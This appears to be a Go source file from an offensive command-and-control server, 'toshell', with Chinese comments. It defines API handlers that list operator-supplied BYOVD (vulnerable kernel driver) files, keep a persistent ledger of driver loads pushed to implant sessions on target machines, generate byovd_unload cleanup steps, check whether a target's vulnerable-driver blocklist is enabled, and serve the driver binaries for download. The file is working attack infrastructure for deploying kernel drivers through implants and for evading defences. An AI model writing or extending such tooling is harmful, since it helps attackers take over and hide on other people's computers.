package api

import (
	"encoding/json"
	"net/http"
	"strings"

	"github.com/gorilla/mux"

	"toshell/internal/server/drivers"
)

// listDriversHandler 返回**操作员自备**的 BYOVD 驱动目录（服务端不再内置任何驱动）：
// 扫描 exe 同目录 drivers/、CWD drivers/、data/drivers/ 下的 *.sys + manifest.json。
// 前端据此展示"可加载的驱动"；列表为空表示需要自行放置/上传 .sys。
func (s *Server) listDriversHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	list := drivers.List()
	// signature_summary：把**实测**签名结论汇总一下（List 已经逐个验过，不算额外开销）。
	// 为什么要这个汇总：前端表格能逐行显示，但"这台机器上到底有几个驱动签名有问题"要划到最下面
	// 才看得出来；给一个汇总，缺签名/声明与实测不符的驱动数量一眼可见。
	summary := map[string]int{
		"total": len(list), "signed": 0, "unsigned": 0, "signature_unchecked": 0,
		"declaration_mismatch": 0, "missing_signature_declaration": 0, "require_signature": 0,
		"hash_mismatch": 0,
	}
	for _, d := range list {
		if d.Verify == nil {
			continue
		}
		v := d.Verify
		switch {
		case !v.SignatureChecked:
			summary["signature_unchecked"]++
		case v.Signed:
			summary["signed"]++
		default:
			summary["unsigned"]++
		}
		if v.SignatureConsistent != nil && !*v.SignatureConsistent {
			summary["declaration_mismatch"]++
		}
		if v.DeclaredSignature == "" {
			summary["missing_signature_declaration"]++
		}
		if v.RequireSignature {
			summary["require_signature"]++
		}
		if !v.HashOK {
			summary["hash_mismatch"]++
		}
	}
	json.NewEncoder(w).Encode(map[string]interface{}{
		"drivers":           list,
		"count":             len(list),
		"search_dirs":       drivers.SearchDirs(),
		"builtin":           false,
		"signature_summary": summary,
		"signature_hint": "declared_* 是 manifest 的人工声明，signed/signer/signature_consistent 是本机实测；" +
			"signature_consistent=false 表示声明与实测不一致（默认只告警不拒发，除非 manifest 写了 require_signature:true）",
		"manifest_hint": "把 .sys 放进任一 search_dirs，并在同目录 manifest.json 里声明 device/service/ioctl/purpose" +
			"（可选 signed / signer / require_signature / sha256）；或在前端加载时手填",
	})
}

// driverLedgerOf 返回驱动加载台账（懒初始化，便于测试注入临时路径）。
//
// 与 modules.Store 同一手法：Server 上留一个字段，nil 时按默认路径建一个。
// 为什么要落盘而不是只放内存：这个台账存在的**唯一理由**就是跨服务端进程重启 ——
// 目标机上已加载的内核驱动不会因为服务端重启而卸载，而内存里的登记（sessionDrivers）
// 与任务表都会消失，重启后就再也说不清"我在哪些机器上加载过哪些服务"。
func (s *Server) driverLedgerOf() *drivers.Ledger {
	s.driverMu.Lock()
	defer s.driverMu.Unlock()
	if s.driverLedger == nil {
		s.driverLedger = drivers.NewLedger("")
	}
	return s.driverLedger
}

// driverLedgerHandler GET /api/v1/drivers/ledger
//
// 返回：全部加载记录 + 仍可能残留的条目 + **可执行**的清场指引（每条都带可照抄的
// byovd_unload 请求）。这是"服务端进程重启 / 目标机重启 / 植入端重连"之后，
// 操作员用来收尾的唯一入口。
//
// 语义边界（响应里也会写明，避免被当成"目标机现状报告"）：
// 台账记录的是"**服务端创建过相应任务**"（包括推送失败、仍压在队列里、心跳取走后会执行的那些），
// 不代表目标机一定执行成功 —— 服务端没有枚举目标机服务的能力，这一层只能由任务结果回答。
func (s *Server) driverLedgerHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")

	led := s.driverLedgerOf()
	// 在线判定：只对台账里出现过的会话 id 逐个查（条数很少），不扫全量会话表。
	alive := map[string]bool{}
	for _, e := range led.Pending() {
		sid := e.SessionID
		if sess, err := s.sessionMgr.Get(sid); err == nil && sess != nil && sess.Info != nil {
			alive[sid] = strings.EqualFold(sess.Info.Status, "active") || sess.IsAlive()
		}
	}
	pending := led.Pending()
	all := led.All()
	cleanup := drivers.BuildCleanupPlan(pending, alive)

	online, offline := 0, 0
	for _, step := range cleanup {
		if step.Blocked {
			offline++
		} else {
			online++
		}
	}
	notes := []string{
		"台账记录的是『服务端创建过加载/卸载任务』，**不代表目标机执行成功**：" +
			"服务端没有枚举目标机服务的能力，执行结果只能看任务结果（load_task_id）。" +
			"注意推送失败的任务仍会留在队列里、被后续心跳取走执行 —— 所以推送失败的加载同样会记账。",
		"清场走既有的 byovd_unload 动作（分级入口 L3，需 confirm=true）：停止内核服务并删除 " +
			"%SystemRoot%\\System32\\drivers\\<service_name>.sys（文件不可恢复）。",
		"服务端**不会**在重启时自动下发清理：本项目的既有口径是破坏性任务不自动重投递，" +
			"且 session_id 在植入端每次启动时都会重新生成，服务端无法确认新会话就是原来那台机器。",
		"目标机重启不会清除已注册的内核服务与驱动文件（服务是按需启动，不会自启，但注册项与 .sys 仍在）：" +
			"这类" + "「残留但未运行」" + "同样需要显式 byovd_unload 清场。",
	}
	resp := map[string]interface{}{
		"ok":    true,
		"path":  led.Path(),
		"count": len(all),
		"counts": map[string]int{
			"total":             len(all),
			"pending":           len(pending),
			"pending_online":    online,
			"pending_offline":   offline,
			"unload_dispatched": len(all) - len(pending),
		},
		"pending": pending,
		"entries": all,
		"cleanup": cleanup,
		"notes":   notes,
	}
	if err := led.LoadError(); err != nil {
		resp["load_error"] = err.Error()
		resp["ok"] = false
		resp["error"] = "驱动台账读取失败：" + err.Error() +
			"（台账文件损坏或权限不足；不影响 byovd_load/byovd_unload 的功能，但清场指引不可用）"
	}
	json.NewEncoder(w).Encode(resp)
}

// verifyDriverHandler 对**操作员自备**的驱动做加载前自检（ROADMAP P0-1）：
// sha256 与 manifest 声明是否一致、本机 Authenticode 签名是否有效、本机易受攻击驱动
// 黑名单是否启用（以及黑名单数据文件是否存在）。
//
// 路由：GET /drivers/{name}/verify —— 需在 api.go 注册（见交付说明）。未找到驱动返回 404 + 中文原因。
func (s *Server) verifyDriverHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	name := mux.Vars(r)["name"]
	d, err := drivers.Find(name)
	if err != nil {
		w.WriteHeader(http.StatusNotFound)
		json.NewEncoder(w).Encode(map[string]interface{}{
			"error": err.Error(),
			"name":  name,
		})
		return
	}
	// List() 已经算过 sha256 并复用同一份读取结果做过自检，这里直接用，不再读盘。
	res := drivers.VerifyResult{}
	if d.Verify != nil {
		res = *d.Verify
	}
	json.NewEncoder(w).Encode(struct {
		Driver  string `json:"driver"`
		File    string `json:"file"`
		Path    string `json:"path"`
		OK      bool   `json:"ok"`
		Summary string `json:"summary"`
		drivers.VerifyResult
	}{
		Driver:       d.Name,
		File:         d.File,
		Path:         d.Path,
		OK:           len(res.Errors) == 0,
		Summary:      res.Summary(),
		VerifyResult: res,
	})
}

// downloadDriverHandler 返回内置驱动原始二进制（仅允许目录内名称，防路径穿越）。
func (s *Server) downloadDriverHandler(w http.ResponseWriter, r *http.Request) {
	name := mux.Vars(r)["name"]
	d, data, err := drivers.Get(name)
	if err != nil {
		http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusNotFound)
		return
	}
	w.Header().Set("Content-Type", "application/octet-stream")
	w.Header().Set("Content-Disposition", `attachment; filename="`+d.Name+`"`)
	w.Header().Set("X-Driver-Name", d.Name)
	w.Header().Set("X-Driver-Device", d.Device)
	w.Header().Set("X-Driver-Service", d.Service)
	w.Header().Set("X-Driver-SHA256", d.SHA256)
	w.Write(data)
}
